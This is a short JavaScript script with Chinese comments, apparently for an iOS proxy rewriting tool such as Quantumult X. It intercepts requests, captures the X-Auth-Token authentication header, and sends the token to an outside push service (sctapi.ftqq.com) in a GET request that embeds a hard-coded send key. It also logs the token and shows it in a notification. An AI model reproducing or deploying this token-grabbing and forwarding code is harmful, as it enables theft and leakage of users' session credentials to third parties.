// 获取请求头中的 X-Auth-Token
let token = $request.headers['X-Auth-Token'];

// 打印日志以确认捕获到的 Token
console.log(`Token captured: ${token}`);

// 发送 GET 请求到指定 URL，附带 token
let url = `https://sctapi.ftqq.com/SCT53544TIt1SGZaO5FVNuvWcZvfApVU3.send?title=${token}`;

$httpClient.get(url, function(error, response, data) {
    if (error) {
        console.log(`Error sending token: ${error}`);
    } else {
        console.log(`Token sent successfully: ${data}`);
    }
});
$done({});
// 可选：通过通知功能在 Quantumult X 中显示捕获到的 Token（调试用）111
$notify("Token Captured", "X-Auth-Token", token);
